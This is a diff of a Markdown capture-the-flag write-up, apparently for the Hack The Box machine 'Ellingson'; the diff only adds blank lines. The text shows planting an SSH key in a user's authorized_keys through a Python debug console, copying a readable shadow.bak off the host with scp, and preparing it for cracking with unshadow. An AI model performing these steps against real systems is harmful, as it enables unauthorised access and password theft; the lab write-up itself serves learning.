@@ -64,16 +64,19 @@ So there are a few directories but nothing we didn't find with the manual enumer
 <center><img src="/htb/ellingson/debug.png"></center>
 <br>
 I can check what user I am by using the <b>getpass</b> module
+
 ```
 >>> import getpass; getpass.getuser()
 'hal'
 ```
 Listing the different users I can see that there are 4 different users
+
 ```
 >>> import os; os.listdir("/home/")
 ['margo', 'duke', 'hal', 'theplague']
 ```
 I try to list the contents of the other users home directory but I get a <b>permission denied</b> message. If I list the contents of <b>hal</b> home directory I do see the <b>.ssh</b> folder where I will add my public ssh key so I would be able to SSH into the box. I actually had a problem where I had to delete the old <b>authorized_keys</b> file and create a new one for this to work.
+
 ```
 >>> import os; os.listdir("/home/hal")
 ['.profile', '.bashrc', '.ssh', '.gnupg', '.bash_logout', '.viminfo', '.cache']
@@ -85,6 +88,7 @@ I try to list the contents of the other users home directory but I get a <b>perm
 >>> file = open('/home/hal/.ssh/authorized_keys', 'a+'); file.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBUPV7FTCebGM8cVPLNAXafVzGxdKWapX8HWSQ6GrzSBCMzB3sFt7yJEeWBGGVOnXM7dz0hpXkyRJ7dU+qhuOApYK2oW8hZmPLHK9+/9+kdFWUQdi/yIMnHuwU/ol2g1k68IrEMv5SgYZayn5+lC6vNng8+Jbs3hAsA0yLcurz86HwJlCOYNJi6cWTaULrTfuwxeWGRIClCUOxct2AJ64jfIAHZJLO0EkRSZZdNxV/dOeQT5WzZYnW9ExEroFpjzyBOkLdTcUNolA2xkTR2tO0YMwJMBGwirbBL4gf0Ibrm4aQ9Cfz0T56zm9YC9eeP82kZS86N6991hbD7LZR7jv4r6SK9hqEYOAhbE5n2ytPAEb6XF7y1ps6PrbwuVaJAustme41oCYafeDjmEjXIO8t6SUIA9HI+WoBp6K4YLI7zKVMWi5Ij705fjHTqEraDw27c3RZhhpJ0Z9zGeMSjG8wD+QvGjIlkMc+5/AAh1KP6EiCoyv5SK0iFjQ2hF7byoM= root@kali"); file.close()
 ```
 Now I am able to SSH in using my public key
+
 ```
 # ssh -i id_rsa.pub hal@10.10.10.139
 Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-46-generic x86_64)
@@ -113,11 +117,13 @@ Last login: Sun Mar 10 21:36:56 2019 from 192.168.1.211
 hal@ellingson:~$
 ```
 As the user <b>hal</b> I start doing some manual enumeration where I eventually come across a <b>shadow.bak</b> that I have read permissions too in the <b>/var/backups</b> directory.
+
 ```
 hal@ellingson:/var/backups$ ls -la shadow.bak
 -rw-r----- 1 root adm 1309 Mar  9  2019 shadow.bak
 ```
 Next step is to copy over the <b>shadow.bak</b> and the <b>passwd</b> file over to my kali box so I can crack the passwords with <b>john</b>. I will use <b>scp</b> for this
+
 ```
 # scp -i id_rsa.pub hal@10.10.10.139:/var/backups/shadow.bak .
 shadow.bak                                                                                 100% 1309    41.6KB/s   00:00    
@@ -126,6 +132,7 @@ shadow.bak                                                                      
 passwd                                                                                     100% 1757    54.6KB/s   00:00    
 ```
 Now using the <b>unshadow</b> command to put the files into a format <b>john</b> can read.
+
 ```
 # unshadow passwd shadow.bak > unshadowed.txt
 Created directory: /root/.john
